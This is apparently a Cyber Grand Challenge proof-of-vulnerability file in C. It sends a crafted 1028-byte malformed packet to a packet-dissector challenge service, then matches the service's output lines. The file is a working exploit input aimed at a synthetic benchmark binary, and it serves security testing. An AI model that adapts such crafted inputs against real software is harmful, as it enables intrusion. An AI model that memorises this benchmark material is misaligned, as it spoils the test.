#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x4f\x62\xd0\x7e"
         "\xd6\x0b\x3a\xf8\x1b\xac\x00\x6f\xdf\x35\xd4\xc5\xa8\xe6\x63\xc8"
         "\x0c\x00\x00\x00\x55\x57\x00\xa4\x23\xc0\xf6\xe3\xe1\x7a\xc5\x5e"
         "\xf8\x52\x0b\x31\x70\xd9\x9a\x7e\x0e\x00\x5a\x13\x0a\x57\x00\x57"
         "\xf2\x89\xb8\x62\x52\x81\x17\x11\x4b\xbb\x92\xcd\x88\x54\xfa\x73"
         "\xb9\xbf\x6f\x34\x9c\x90\x35\x9f\x13\xff\x7c\xd4\x20\xcc\x5b\xaa"
         "\xbe\x15\x7a\x58\x3e\xb3\xcd\x2e\xca\xa8\x70\x47\xaa\xcd\x2d\x24"
         "\x79\x6d\xf8\xea\xbb\x4d\x33\xca\x48\x70\xca\xd0\xb4\xab\x17\xe7"
         "\x71\x4d\x5d\xea\x21\xd7\xff\xf5\x55\x42\x04\x8d\x0d\x02\x17\x63"
         "\x75\x2b\x5f\xc8\xf2\x04\x0f\x25\xca\x11\xff\x57\xec\xa5\x0e\x16"
         "\xa9\x3e\x77\x7f\x5e\xc4\x77\xe5\xa3\x30\xf8\x74\x96\xe8\x3f\xcc"
         "\x87\x1f\x97\x5d\xcc\xe9\x29\x08\xd2\x3a\xd8\x16\x1f\xf6\xa1\x25"
         "\xb8\xa1\xdd\x37\xdf\x31\x39\x65\xbd\x37\xc6\x4e\x71\x53\x93\xf6"
         "\x90\x12\xbd\x5c\x80\xed\xf6\x81\x7e\x67\x1c\xa2\x70\x57\x9b\x6d"
         "\x1f\xa0\x01\xd2\xcc\x04\x41\x03\x9b\x43\x96\x5e\x63\xb1\xe3\xf0"
         "\x17\xf1\xeb\xd6\x65\x3a\x73\x88\x0e\xa4\xc5\x17\x10\xb4\x56\xf2"
         "\xf4\xcf\xe3\xe2\x04\xf6\xd9\x8f\x81\x84\x1d\x34\x7a\xaa\x65\x7c"
         "\xfc\x9e\x1b\x23\x38\xdf\xec\x8d\xb1\xcf\xed\x91\x75\xa8\x86\x7b"
         "\x44\x31\x16\xac\x1d\x04\xf0\x4e\x3e\x17\x93\xbd\xed\x2f\x56\xc6"
         "\xb6\xa2\xc0\xfc\x21\x41\x52\xcf\xc2\xc2\xa6\x81\x1f\x21\x35\x90"
         "\xf7\xe5\xaa\x44\x4c\xc7\x2e\x3f\x61\xbe\x7b\xbf\xfb\x88\xbc\x78"
         "\x6b\x93\x73\x74\x5f\xfe\x21\xc9\xfa\x6a\xca\xd1\x97\xea\xb4\x6c"
         "\xe2\xe1\x23\xa4\x05\xc4\x7f\x65\xfb\xa0\xa1\xf2\xe0\x9d\xc3\x74"
         "\x0a\xad\x3c\xde\x88\x52\xe6\x22\xf0\x73\x57\x00\x02\xa3\x0e\xc8"
         "\x10\xa6\x4d\xad\xe5\xdd\xeb\x4c\xf1\x3d\x41\x67\xe5\x90\x65\x04"
         "\x64\x2e\x45\xd4\xb0\xbe\xe5\xb8\xc7\x87\x77\xc4\x7a\xe4\xff\x3a"
         "\xd0\x39\xd6\x99\x69\xd2\x69\x00\x61\x3c\xdb\xd5\x0a\xa5\x14\xe6"
         "\xf5\x86\x4b\xe4\x08\xcd\x33\x03\x03\x05\x83\x14\x81\xd3\x7a\xbf"
         "\x7d\xb9\xbd\xfc\xa9\x78\x21\x95\x71\xdd\x54\xa5\x20\x66\x32\x72"
         "\x05\xcc\xf8\x02\x80\xa1\x13\xb9\xad\x76\x37\xa7\xf7\xcd\xb7\xcf"
         "\x86\x25\x6b\x16\xd7\x72\x0d\xad\x66\xec\x4e\xe3\x50\x0d\x50\x4b"
         "\xce\x51\x6d\xb4\xdd\xae\x48\x85\xd7\x74\xfe\x1b\x2f\x04\x12\x2b"
         "\x14\xd0\x75\x55\x26\x48\x4d\x1d\xf9\x6f\x3a\x0c\x26\x40\x7d\x87"
         "\x63\x79\xfd\x31\xba\x7b\x32\x3c\x99\x87\x87\x84\xa8\x71\x9e\x14"
         "\x3a\xb1\xfa\x04\x53\xb4\x82\x9c\x19\x63\x98\xe4\x5b\xfb\xc8\x93"
         "\xab\x61\xd0\x33\xe2\x8a\x03\x59\xf5\x1a\xea\x3f\x94\x5a\xd3\xfa"
         "\x6b\xef\x0d\x8b\xd3\xa9\x49\x2d\x60\xea\x93\xf0\x92\xd5\xa5\x96"
         "\xaf\xb9\x88\x50\xc7\x2b\xc3\xc5\x24\xfb\xe0\x06\x48\xf8\xa1\xa4"
         "\x82\x53\x24\xc8\x39\x63\xfd\x98\x14\xf6\x3a\xd6\x3d\x68\xc6\x0a"
         "\x36\x84\x23\xc5\xd8\x81\x53\x28\xb5\x0d\x1c\xc6\x0e\x57\xd7\x1c"
         "\x04\xd2\x74\x97\x68\x3a\xc2\xe2\xe3\x9c\xb5\xe6\x99\x43\x41\x47"
         "\x79\x1b\x61\xd6\xa4\x2e\x1d\x5b\x48\x4a\x28\xd3\x46\x2e\x2e\x3f"
         "\x9a\xb8\x15\xd0\xd9\x59\x49\x64\x05\x92\xae\x44\x1e\x93\x81\x8d"
         "\x55\x3f\xba\x13\x93\x03\x7d\xd8\xec\xe7\xb1\xe4\x0d\xc6\xd4\x47"
         "\x01\xdc\xea\xef\x20\x56\x1b\xed\x99\x11\x64\xbd\x15\x1f\x2f\x0d"
         "\x60\x57\xb2\x57\x51\x74\x54\x2d\x68\xb5\xad\x7a\xee\xc5\xee\x2d"
         "\xc6\x4e\x77\x1c\xb3\x1b\x95\xc6\x27\xb7\xb6\x96\x33\x6b\x01\x02"
         "\xb8\xe6\x9e\x08\x68\xf6\x39\xc9\x7e\x11\x6e\x61\x2d\x04\x11\x7e"
         "\x35\xc3\x14\xd4\xd5\x11\x18\xfb\x99\x35\xc0\xf2\xc1\xac\x0b\xe1"
         "\xb0\x41\x5f\xa5\x46\x82\x78\xa0\xf5\xd8\x53\x66\x58\xd0\x5a\x87"
         "\x24\x02\xd0\xca\x2a\x66\xe5\x8a\x2f\x89\xe2\x93\xcf\x52\x5d\xb6"
         "\xb5\xb4\xd6\xcb\x15\x13\x11\xa3\xe7\x42\x9a\xe5\x58\x75\x65\x48"
         "\x4d\xe9\xb6\x59\x67\x0b\xbe\x61\x63\x73\x7b\x61\x72\xe6\x8d\x14"
         "\x4d\x02\x56\x18\xb9\x57\x00\xcb\xf3\x80\xb0\xeb\x4b\xa6\xd3\xca"
         "\x32\x69\xa4\xdf\x57\xa0\xe9\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===kansrush
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6b\x61\x6e\x73\x72\x75\x73\x68";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
